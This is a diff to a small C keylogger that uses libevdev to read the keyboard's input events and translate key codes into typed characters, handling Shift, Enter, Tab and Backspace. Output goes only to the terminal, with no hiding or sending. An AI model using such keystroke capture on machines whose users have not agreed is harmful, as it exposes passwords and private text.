@@ -1,4 +1,5 @@
 #include <libevdev/libevdev.h>
+#include <ctype.h> 
 #include <stdbool.h>
 #include <linux/input.h>
 #include <fcntl.h>
@@ -7,6 +8,88 @@
 #include <errno.h>
 #include <unistd.h>
 #include <dirent.h>
+
+//key map refer to: https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h
+
+bool shift = false;
+
+static const char table[256] = {
+  [0]  = '\0',
+  [2]  = '1',
+  [3]  = '2',
+  [4]  = '3',
+  [5]  = '4',
+  [6]  = '5',
+  [7]  = '6',
+  [8]  = '7',
+  [9]  = '8',
+  [10] = '9',
+  [11] = '0',
+  [12] = '-',
+  [13] = '=',
+  [16] = 'q',
+  [17] = 'w',
+  [18] = 'e',
+  [19] = 'r',
+  [20] = 't',
+  [21] = 'y',
+  [22] = 'u',
+  [23] = 'i',
+  [24] = 'o',
+  [25] = 'p',
+  [26] = '[',
+  [27] = ']',
+  [30] = 'a',
+  [31] = 's',
+  [32] = 'd',
+  [33] = 'f',
+  [34] = 'g',
+  [35] = 'h',
+  [36] = 'j',
+  [37] = 'k',
+  [38] = 'l',
+  [39] = ';',
+  [40] = '\'',
+  [41] = '`',
+  [43] = '\\',
+  [44] = 'z',
+  [45] = 'x',
+  [46] = 'c',
+  [47] = 'v',
+  [48] = 'b',
+  [49] = 'n',
+  [50] = 'm',
+  [51] = ',',
+  [52] = '.',
+  [53] = '/',
+  [55] = '*',
+  [57] = ' ',
+};
+
+static const char shift_table[256] = {
+  [0] = '\0',
+  [KEY_GRAVE] = '~',
+  [KEY_1] = '!',
+  [KEY_2] = '@',
+  [KEY_3] = '#',
+  [KEY_4] = '$',
+  [KEY_5] = '%',
+  [KEY_6] = '^',
+  [KEY_7] = '&',
+  [KEY_8] = '*',
+  [KEY_9] = '(',
+  [KEY_0] = ')',
+  [KEY_MINUS] = '_',
+  [KEY_EQUAL] = '+',
+  [KEY_BACKSLASH] = '|',
+  [KEY_SEMICOLON] = ':',
+  [KEY_APOSTROPHE] = '\"',
+  [KEY_LEFTBRACE] = '{',
+  [KEY_RIGHTBRACE] = '}',
+  [KEY_COMMA] = '<',
+  [KEY_DOT] = '>',
+  [KEY_SLASH] = '?', 
+};
 
 char* get_kb(char* buf, size_t buf_size){
   struct libevdev *dev;
@@ -65,7 +148,7 @@ int main(){
   if(kb_path == NULL){
     printf("no kb\n");
   }else{
-    printf("Keybord: %s\n", kb_path);
+    printf("Keyboard: %s\n", kb_path);
   }
 
   //open up the kb input event file
@@ -78,8 +161,41 @@ int main(){
   //main logger loop
   while (true) {
     read(fd, &event, sizeof(struct input_event));
-    if(event.type == EV_KEY){
-      printf("code: %d\tvalue: %d\n", event.code, event.value);
+
+    //type has to be key and value 1 is key press
+    if(event.type == EV_KEY && event.value == 1){
+      switch(event.code){
+        case KEY_ENTER:
+          printf("\n");
+          break;
+        case KEY_BACKSPACE:
+          printf("\b \b");
+          //manually flush buffer
+          fflush(stdout);
+          break;
+        case KEY_LEFTSHIFT:
+          shift = true;
+          break;
+        case KEY_TAB:
+          printf("\t");
+          fflush(stdout);
+          break;
+        default:
+          if(shift && shift_table[event.code] != '\0'){
+            printf("%c", shift_table[event.code]);
+            fflush(stdout);
+          } else if(shift && shift_table[event.code] == '\0'){
+            printf("%c", toupper(table[event.code]));
+            fflush(stdout);
+          }
+          else{
+            printf("%c", table[event.code]);
+            fflush(stdout);
+          }
+      }
+    } else if(event.code == KEY_LEFTSHIFT && event.value == 0){
+      shift = false;
     }
+
   }
 }
